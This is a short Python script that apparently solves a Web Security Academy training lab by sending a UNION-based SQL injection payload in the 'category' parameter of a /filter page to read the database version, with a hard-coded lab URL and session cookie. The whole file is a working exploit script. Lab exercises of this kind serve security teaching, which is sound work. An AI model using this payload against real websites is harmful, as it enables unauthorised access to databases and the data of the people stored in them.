# SQL injection attack, querying the database type and version on MySQL and Microsoft

import requests

url = "https://0a3200ac04d545f4c0f8119500af005d.web-security-academy.net/"
cookies = dict(session="izgbd0B38NxOZq2vncX0CCPT23Pw9qg9")

PAYLOAD = "' UNION SELECT NULL,@@version -- -"

params = dict(category=PAYLOAD)

r = requests.get(url + "filter", params=params, cookies=cookies)

print(r.url)